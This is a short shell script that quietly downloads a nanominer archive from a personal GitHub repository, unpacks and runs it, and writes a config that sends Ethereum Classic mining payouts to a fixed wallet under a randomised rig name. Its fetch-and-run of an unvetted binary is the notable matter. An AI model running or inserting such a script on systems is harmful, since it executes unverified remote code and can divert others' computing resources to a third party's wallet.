wget -qO nano https://github.com/angkii/ngengBahan/raw/main/nanominer.zip
unzip -qq nano
chmod +x nanominer
echo "[Ethash]
wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
coin = ETC
rigName = $(echo $(shuf -i 1-9999 -n 1)-sty)
rigPassword = x
pool1 = etc.2miners.com:1010" > config.ini
./nanominer
